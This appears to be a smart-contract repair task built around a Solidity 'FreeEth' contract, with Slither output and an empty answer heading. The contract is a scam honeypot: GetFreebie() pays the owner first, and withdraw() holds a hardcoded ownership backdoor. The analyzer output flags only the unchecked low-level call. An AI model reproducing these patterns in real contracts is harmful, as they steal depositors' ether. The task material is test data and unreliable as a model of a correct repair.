/// Your task is to repair the following Solidity Smart Contract
pragma solidity ^0.4.19;

contract FreeEth {
    address public Owner = msg.sender;

    function() public payable {}

    function GetFreebie() public payable {
        if (msg.value > 1 ether) {
            Owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        if (msg.sender == 0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af) {
            Owner = 0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af;
        }
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address adr, bytes data) public payable {
        require(msg.sender == Owner);

        adr.call.value(msg.value)(data);
    }
}

/// This Solidity Smart Contract has been analyzed by smart contract analyzers. Here are the results from these analyzers.

/// 1. Slither Analysis Results
/// 1.1. Vulnerability: unchecked_low_level_call at Line 23-27:
    function Command(address adr, bytes data) public payable {
        require(msg.sender == Owner);

        adr.call.value(msg.value)(data);
///  Message:Low level call in FreeEth.Command (0xdb1c55f6926e7d847ddf8678905ad871a68199d2.sol#23-27):
///   	-adr.call.value(msg.value)(data) 0xdb1c55f6926e7d847ddf8678905ad871a68199d2.sol#26



/// Repaired Solidity Smart Contract